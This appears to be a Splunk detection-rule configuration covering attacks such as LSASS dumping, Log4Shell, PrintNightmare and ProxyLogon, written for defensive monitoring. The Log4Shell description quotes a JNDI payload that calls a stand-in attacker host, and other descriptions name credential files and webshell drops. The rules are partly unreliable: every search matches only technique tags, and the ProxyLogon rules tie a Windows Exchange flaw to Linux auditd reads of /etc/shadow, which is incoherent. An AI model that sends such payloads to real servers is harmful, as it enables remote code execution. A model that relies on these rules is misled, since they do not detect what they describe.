[LSASS Memory Dump via Task Manager]
search = index=dv-telemetry (technique="T1003.001") | eval detection="LSASS Memory Dump via Task Manager" | table _time, technique, key, exe, uid, cmd_output
alert.severity = 1
description = Detects LSASS memory dump creation via Task Manager or other tools that use
the MiniDumpWriteDump API. Commonly used during credential access attacks.


[Log4Shell JNDI Injection Attempt]
search = index=dv-telemetry (technique="T1190" OR technique="T1059.004") | eval detection="Log4Shell JNDI Injection Attempt" | table _time, technique, key, exe, uid, cmd_output
alert.severity = 1
description = Detects exploitation attempts targeting Apache Log4j's JNDI lookup feature
(Log4Shell, CVE-2021-44228). Attackers embed ${jndi:ldap://attacker.com/a}
payloads in HTTP headers, User-Agent strings, or request parameters to trigger
remote class loading via LDAP/RMI and achieve unauthenticated RCE on the server.


[Log4Shell RCE - Outbound Network Connection from Vulnerable Process]
search = index=dv-telemetry (technique="T1190" OR technique="T1059.004") | eval detection="Log4Shell RCE - Outbound Network Connection from Vulnerable Process" | table _time, technique, key, exe, uid, cmd_output
alert.severity = 2
description = Detects CVE-2021-44228 (Log4Shell) exploitation via the real observable:
an outbound network connection (JNDI lookup) triggered by a web process,
followed by shell execution. Matches real auditd kernel events rather than
webserver log strings.


[MSHTA Spawning Windows Shell]
search = index=dv-telemetry (technique="T1218.005" OR technique="T1059.001") | eval detection="MSHTA Spawning Windows Shell" | table _time, technique, key, exe, uid, cmd_output
alert.severity = 2
description = Detects MSHTA.exe spawning a Windows shell such as cmd.exe or PowerShell.

[Nmap Port Scan Detected]
search = index=dv-telemetry (technique="T1046") | eval detection="Nmap Port Scan Detected" | table _time, technique, key, exe, uid, cmd_output
alert.severity = 3
description = Detects Nmap network scanning activity based on network flow anomalies.

[PrintNightmare Spooler Service Exploitation]
search = index=dv-telemetry (technique="T1068" OR technique="T1547.012" OR technique="T1574.001") | eval detection="PrintNightmare Spooler Service Exploitation" | table _time, technique, key, exe, uid, cmd_output
alert.severity = 2
description = Detects PrintNightmare (CVE-2021-34527) exploitation attempts where the Windows
Print Spooler service (spoolsv.exe) spawns unexpected child processes or loads
a DLL from a remote UNC path. Successful exploitation grants SYSTEM privileges
(local) or allows unauthenticated RCE via the RpcAddPrinterDriverEx() call
(remote). Both privilege escalation and lateral movement paths are covered.


[ProxyLogon Exchange Server SSRF Exploitation]
search = index=dv-telemetry (technique="T1190" OR technique="T1505.003" OR technique="T1078") | eval detection="ProxyLogon Exchange Server SSRF Exploitation" | table _time, technique, key, exe, uid, cmd_output
alert.severity = 1
description = Detects exploitation of the Microsoft Exchange Server SSRF chain (ProxyLogon,
CVE-2021-26855). Attackers craft HTTP requests with a malicious X-BEResource
cookie to bypass authentication and reach the Exchange backend as SYSTEM. This
is frequently chained with CVE-2021-27065 to drop a webshell under the
Exchange web root (aspnet_client), enabling persistent remote access.


[ProxyLogon - Sensitive File Access with Root Privileges]
search = index=dv-telemetry (technique="T1190" OR technique="T1552.001" OR technique="T1078") | eval detection="ProxyLogon - Sensitive File Access with Root Privileges" | table _time, technique, key, exe, uid, cmd_output
alert.severity = 2
description = Detects CVE-2021-26855 (ProxyLogon) post-exploitation activity via real
auditd observables: root-level access to sensitive credential files
(/etc/passwd, /etc/shadow, /etc/sudoers) combined with identity checks.
Matches real kernel events rather than Exchange-specific HTTP patterns.


